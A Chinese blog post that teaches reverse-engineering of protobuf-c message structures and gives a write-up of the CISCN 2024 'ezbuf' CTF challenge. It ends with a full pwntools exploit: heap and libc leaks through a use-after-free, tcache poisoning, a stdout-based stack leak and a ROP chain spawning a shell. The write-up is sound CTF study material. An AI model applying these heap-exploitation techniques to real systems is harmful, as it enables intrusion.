---
title: "Protobuf pwn"
date: 2024-05-22T16:34:26+08:00
lastmod: 2024-05-22T16:34:26+08:00
author: ["Y4ng"]

categories:
- PWN
- study

tags:
- pwn
- protobuf

keywords:
- pwn
- protobuf

description: "感觉不如JSON🤷‍♂️" # 文章描述，与搜索优化相关
summary: "感觉不如JSON🤷‍♂️" # 文章简单描述，会展示在主页
weight: # 输入1可以顶置文章，用来给文章展示排序，不填就默认按时间排序
slug: ""
draft: false # 是否为草稿
comments: true
showToc: true # 显示目录
TocOpen: true # 自动展开目录
autonumbering: true # 目录自动编号
hidemeta: false # 是否隐藏文章的元信息，如发布日期、作者等
disableShare: true # 底部不显示分享栏
searchHidden: false # 该页面可以被搜索到
showbreadcrumbs: true #顶部显示当前路径
mermaid: true
cover:
    image: ""
    caption: ""
    alt: ""
    relative: false

---

<!-- more --> 

# Protobuf pwn

## Introduction

~~Protocol Buffers are language-neutral, platform-neutral extensible mechanisms for serializing structured data.~~

google发明的一个数据格式，平台兼容性和语言兼容性都非常好，能够将数据结构体转换成bytes形式发送，也能将bytes流反序列化为结构体（可是👨选择json



## Install protobuf on Ubuntu

~~~bash
# install protobuf
git clone -b v3.21.0 https://github.com/protocolbuffers/protobuf.git # 大于3.20都ok
sudo apt-get install autoconf automake libtool curl make g++ unzip # 一些依赖
sudo ./autogen.sh   #生成配置脚本
sudo ./configure    # 可选 --prefix=path ，默认路径为/usr/local/
make -j`nproc`          
sudo make install 
sudo ldconfig       # refresh shared library cache
which protoc        # find the location
protoc --version    # check

# install protobuf-c
git clone https://github.com/protobuf-c/protobuf-c.git
./autogen.sh && ./configure 
make -j8  # 开nproc给我卡死了...
sudo make install
~~~

👨的垃圾虚拟机编译安装是真的一坨💩

## To reverse protobuf

先创建一个`xxx.proto`文件

~~~c
syntax="proto3"; //proto version 2 or 3

message devicemsg{
    bytes whatcon = 1;
    sint64 whattodo = 2;
    sint64 whatidx = 3;
    sint64 whatsize = 4;
    uint32 whatsthis = 5;
}
~~~

### C语言下分析

输入以下命令

~~~bash
protoc --c_out=./ devicemsg.proto
~~~

--c_out=./ : 将.proto文件以C语言格式输出在当前目录下

分析.c文件

### 序列化和反序列化函数

~~~c
size_t devicemsg__pack (const Devicemsg *message, uint8_t *out) //序列化
{
  assert(message->base.descriptor == &devicemsg__descriptor);
  return protobuf_c_message_pack ((const ProtobufCMessage*)message, out);
}
Devicemsg *devicemsg__unpack(ProtobufCAllocator  *allocator, size_t len, const uint8_t *data) // 反序列化
{
  return (Devicemsg *)protobuf_c_message_unpack(&devicemsg__descriptor,allocator, len, data);
}
~~~

### 结构体信息

~~~c
static const ProtobufCFieldDescriptor devicemsg__field_descriptors[5] =
{
  {
    "whatcon",
    1,
    PROTOBUF_C_LABEL_NONE,
    PROTOBUF_C_TYPE_BYTES,
    0,   /* quantifier_offset */
    offsetof(Devicemsg, whatcon),
    NULL,
    NULL,
    0,             /* flags */
    0,NULL,NULL    /* reserved1,reserved2, etc */
  },
  {
    "whattodo",
    2,
    PROTOBUF_C_LABEL_NONE,
    PROTOBUF_C_TYPE_SINT64,
    0,   /* quantifier_offset */
    offsetof(Devicemsg, whattodo),
    NULL,
    NULL,
    0,             /* flags */
    0,NULL,NULL    /* reserved1,reserved2, etc */
  },
  {
    "whatidx",
    3,
    PROTOBUF_C_LABEL_NONE,
    PROTOBUF_C_TYPE_SINT64,
    0,   /* quantifier_offset */
    offsetof(Devicemsg, whatidx),
    NULL,
    NULL,
    0,             /* flags */
    0,NULL,NULL    /* reserved1,reserved2, etc */
  },
  {
    "whatsize",
    4,
    PROTOBUF_C_LABEL_NONE,
    PROTOBUF_C_TYPE_SINT64,
    0,   /* quantifier_offset */
    offsetof(Devicemsg, whatsize),
    NULL,
    NULL,
    0,             /* flags */
    0,NULL,NULL    /* reserved1,reserved2, etc */
  },
  {
    "whatsthis",
    5,
    PROTOBUF_C_LABEL_NONE,
    PROTOBUF_C_TYPE_UINT32,
    0,   /* quantifier_offset */
    offsetof(Devicemsg, whatsthis),
    NULL,
    NULL,
    0,             /* flags */
    0,NULL,NULL    /* reserved1,reserved2, etc */
  },
};
static const unsigned devicemsg__field_indices_by_name[] = {
  0,   /* field[0] = whatcon */
  2,   /* field[2] = whatidx */
  3,   /* field[3] = whatsize */
  4,   /* field[4] = whatsthis */
  1,   /* field[1] = whattodo */
};
static const ProtobufCIntRange devicemsg__number_ranges[1 + 1] =
{
  { 1, 0 },
  { 0, 5 }
};
const ProtobufCMessageDescriptor devicemsg__descriptor =
{
  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,
  "devicemsg",
  "Devicemsg",
  "Devicemsg",
  "",
  sizeof(Devicemsg),
  5,
  devicemsg__field_descriptors,
  devicemsg__field_indices_by_name,
  1,  devicemsg__number_ranges,
  (ProtobufCMessageInit) devicemsg__init,
  NULL,NULL,NULL    /* reserved[123] */
};

~~~

可以看到每一个结构体中，字段信息分别是成员名称，序号索引，标签，数据类型，限定符字段偏移（俺也没弄懂，偏移量（和结构体首地址的）...

### 类型表

~~~c
typedef enum {
	PROTOBUF_C_TYPE_INT32,      /**< int32 */
	PROTOBUF_C_TYPE_SINT32,     /**< signed int32 */
	PROTOBUF_C_TYPE_SFIXED32,   /**< signed int32 (4 bytes) */
	PROTOBUF_C_TYPE_INT64,      /**< int64 */
	PROTOBUF_C_TYPE_SINT64,     /**< signed int64 */
	PROTOBUF_C_TYPE_SFIXED64,   /**< signed int64 (8 bytes) */
	PROTOBUF_C_TYPE_UINT32,     /**< unsigned int32 */
	PROTOBUF_C_TYPE_FIXED32,    /**< unsigned int32 (4 bytes) */
	PROTOBUF_C_TYPE_UINT64,     /**< unsigned int64 */
	PROTOBUF_C_TYPE_FIXED64,    /**< unsigned int64 (8 bytes) */
	PROTOBUF_C_TYPE_FLOAT,      /**< float */
	PROTOBUF_C_TYPE_DOUBLE,     /**< double */
	PROTOBUF_C_TYPE_BOOL,       /**< boolean */
	PROTOBUF_C_TYPE_ENUM,       /**< enumerated type */
	PROTOBUF_C_TYPE_STRING,     /**< UTF-8 or ASCII string */
	PROTOBUF_C_TYPE_BYTES,      /**< arbitrary byte sequence */
	PROTOBUF_C_TYPE_MESSAGE,    /**< nested message */
} ProtobufCType;
~~~

从0到0x10

### 描述符结构体

~~~c
/**
 * Describes a message.
 */
struct ProtobufCMessageDescriptor {
	/** Magic value checked to ensure that the API is used correctly. */
	uint32_t			magic;

	/** The qualified name (e.g., "namespace.Type"). */
	const char			*name;
	/** The unqualified name as given in the .proto file (e.g., "Type"). */
	const char			*short_name;
	/** Identifier used in generated C code. */
	const char			*c_name;
	/** The dot-separated namespace. */
	const char			*package_name;

	/**
	 * Size in bytes of the C structure representing an instance of this
	 * type of message.
	 */
	size_t				sizeof_message;

	/** Number of elements in `fields`. */
	unsigned			n_fields;
	/** Field descriptors, sorted by tag number. */
	const ProtobufCFieldDescriptor	*fields;
	/** Used for looking up fields by name. */
	const unsigned			*fields_sorted_by_name;

	/** Number of elements in `field_ranges`. */
	unsigned			n_field_ranges;
	/** Used for looking up fields by id. */
	const ProtobufCIntRange		*field_ranges;

	/** Message initialisation function. */
	ProtobufCMessageInit		message_init;

	/** Reserved for future use. */
	void				*reserved1;
	/** Reserved for future use. */
	void				*reserved2;
	/** Reserved for future use. */
	void				*reserved3;
};
~~~

important:

1. magic，一般为0x28AAEEF9
2. n_fields，关系到原始的message结构内有几条记录、
3. fields，这个指向message内所有记录类型组成的一个数组，可以借此逆向分析message结构。

### field结构体

这个结构体就是上文说的储存名称，偏移量的，也是IDA里面看到的

~~~c
struct ProtobufCFieldDescriptor {
	/** Name of the field as given in the .proto file. */
	const char		*name;
	/** Tag value of the field as given in the .proto file. */
	uint32_t		id;
	/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */
	ProtobufCLabel		label;
	/** The type of the field. */
	ProtobufCType		type;
	/**
	 * The offset in bytes of the message's C structure's quantifier field
	 * (the `has_MEMBER` field for optional members or the `n_MEMBER` field
	 * for repeated members or the case enum for oneofs).
	 */
	unsigned		quantifier_offset;
	/**
	 * The offset in bytes into the message's C structure for the member
	 * itself.
	 */
	unsigned		offset;
	/**
	 * A type-specific descriptor.
	 *
	 * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the
	 * corresponding `ProtobufCEnumDescriptor`.
	 *
	 * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to
	 * the corresponding `ProtobufCMessageDescriptor`.
	 *
	 * Otherwise this field is NULL.
	 */
	const void		*descriptor; /* for MESSAGE and ENUM types */
	/** The default value for this field, if defined. May be NULL. */
	const void		*default_value;
	/**
	 * A flag word. Zero or more of the bits defined in the
	 * `ProtobufCFieldFlag` enum may be set.
	 */
	uint32_t		flags;
	/** Reserved for future use. */
	unsigned		reserved_flags;
	/** Reserved for future use. */
	void			*reserved2;
	/** Reserved for future use. */
	void			*reserved3;
};
~~~

具体信息可看[protobuf-c](https://protobuf-c.github.io/protobuf-c/structProtobufCFieldDescriptor.html)

## Use protobuf with python

输入命令

~~~bash
protoc --python_out=./ devicemsg.proto
~~~

生成`devicemsg_pb2.py`

### 模板

~~~python
import devicemsg_pb2
data = devicemsg_pb2.devicemsg() # 方法名称跟随.proto中结构体名称变化
data.whattodo = todo
data.whatcon = content
data.whatidx = idx
data.whatsize = size
data.whatsthis = this
data.SerializeToString() # 转换成bytes
~~~

## CISCN 2024 ezbuf

👨做这题的时候甚至不知道protobuf是什么

### 恢复结构体

![image](1.png)

关键结构体在这，1代表序号1，3代表label，0XF代表类型，查表即可

根据以上字段恢复出protobuf结构体

~~~c
syntax="proto3"; 

message devicemsg{
    bytes whatcon = 1;
    sint64 whattodo = 2;
    sint64 whatidx = 3;
    sint64 whatsize = 4;
    uint32 whatsthis = 5;
}
~~~

### 代码分析

#### 入口

![image](2.png)

偏移和`.data.rel.ro`中的第五个字段正好对应上,除了v4+32

![image](3.png)

从a2-a6分别是，content todo idx size this

#### 菜单

![image](4.png)

函数0是什么都不干，纯解析我们发包的数据，但是会根据数据长度分配对应堆，如func0(str) --> malloc(len(str))

函数1是申请0x30的chunk，然后copy数据进去

函数2是free，里面有UAF

函数3是打印我们申请chunk的数据，超过两次关闭标准输出和错误

### 漏洞利用

通过遗留的`unsorted bin`的`bk`来得到`libc`的地址，然后通过释放第一个`0x40`大小的`chunk`进入tcache，打印出来`heap`地址，UAF修改tcache的fd

申请到`tcache_perthread_struct`,将environ地址添加到size为0x40的tcache堆块上，泄露出stack地址

修改rsp指针，在栈上打ORW

### exp

~~~python
from pwn import *
import devicemsg_pb2
binary_path = './pwn'
libc_path = "./libc.so.6"
context(arch="amd64",os="linux",log_level="debug",terminal = ['tmux','splitw','-h'])
elf = ELF(binary_path)
libc = ELF(libc_path)
argv = f''
p=process(argv=[binary_path, argv])
#p=remote('0.0.0.0',10002)
leak_addr = lambda name,addr: log.success(f'{name}----->'+hex(addr))
main_arena_offset = libc.symbols["__malloc_hook"] + 0x10
#global_max_fast_offset = 0x3c67f8
#free_hook_offset = libc.symbols["__free_hook"]
data = devicemsg_pb2.devicemsg()

def debug():
    gdb.attach(p)
    pause()

def add(idx,content):
    data.whattodo = 1
    data.whatcon = content
    data.whatidx = idx
    data.whatsize=0
    data.whatsthis=0
    p.sendafter(b"WHAT DO YOU WANT?",data.SerializeToString())
  
def show(idx):
    data.whatcon=b"0"
    data.whattodo=3
    data.whatidx=idx
    data.whatsize=0x20
    data.whatsthis=0x20
    p.sendafter("WHAT DO YOU WANT?",data.SerializeToString())

def dele(idx):
    data.whatcon=b"B"*0xc0
    data.whattodo=2
    data.whatidx=idx
    data.whatsize=0x20
    data.whatsthis=0x20
    p.sendafter("WHAT DO YOU WANT?",data.SerializeToString())

def clean(mem):
    data.whatcon=mem
    data.whattodo=0
    data.whatidx=0
    data.whatsize=0x20
    data.whatsthis=0x20
    p.sendafter("WHAT DO YOU WANT?",data.SerializeToString())

def pwn():
    for i in range(9):
       add(i,b"y4ngy4ng")
    show(0)
    p.recvuntil(b"y4ngy4ng")
    libc_addr= u64(p.recv(6).ljust(0x8,b"\x00")) - 0x21ace0 
    leak_addr("libc_addr",libc_addr)
    dele(0)
    show(0)
    p.recvuntil("Content:")
    heap_base = (u64(p.recv(5).ljust(0x8,b"\x00")) << 12) - 0x2000
    leak_addr("heap_base",heap_base)
    for i in range(6):
        dele(i+1)

    dele(7)
    dele(8)
    dele(7)
    for i in range(7):
        add(i,b"A"*0x8)

    environ = libc.sym['environ'] +  libc_addr
    stdout = libc.sym['_IO_2_1_stdout_'] +  libc_addr
    add(7,p64((heap_base+0xf0) ^((heap_base+0x4e40)>>12)))
    add(8,b"AAAAAA")
    add(8,b"A")
    add(8,p64(0)+p64(heap_base+0x10))
    #debug()
    clean((((p16(0)*2+p16(1)+p16(1)).ljust(0x10,b"\x00")+p16(1)+p16(1)).ljust(0x90,b'\x00')+p64(stdout)+p64(stdout)+p64(0)*5+p64(heap_base+0x10)).ljust(0xe0,b"\x00"))
    
    #raw_input()
    clean(p64(0xFBAD1800)+p64(0)*3+p64(environ)+p64(environ+8))
    #debug()
    stack = u64(p.recvuntil("\x7f")[-6:].ljust(0x8,b"\x00")) - 0x1a8 + 0x40 - 0x28
    leak_addr("stack",stack)
    #raw_input()
    #debug()
    clean((((p16(0)*2+p16(0)+p16(0)+p16(1)).ljust(0x10,b"\x00")+p16(1)+p16(1)).ljust(0x90,b'\x00')+p64(0)+p64(0)+p64(stack)).ljust(0xa0,b"\x00"))
    #raw_input()
    pop_rdi = 0x000000000002a3e5 + libc_addr
    system = libc.sym['system'] + libc_addr
    binsh = next(libc.search(b"/bin/sh\x00")) + libc_addr
    ret = 0x000000000002a3e6 + libc_addr

    
    debug()
    clean((b"a"*0x28+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)).ljust(0x58,b"\x00"))
    
    p.interactive()
if __name__ == "__main__":
    pwn()

~~~

## 参考

[ACT TEAM](https://mp.weixin.qq.com/s/RYa2wMD1KIC9IMQ_9NktiQ)

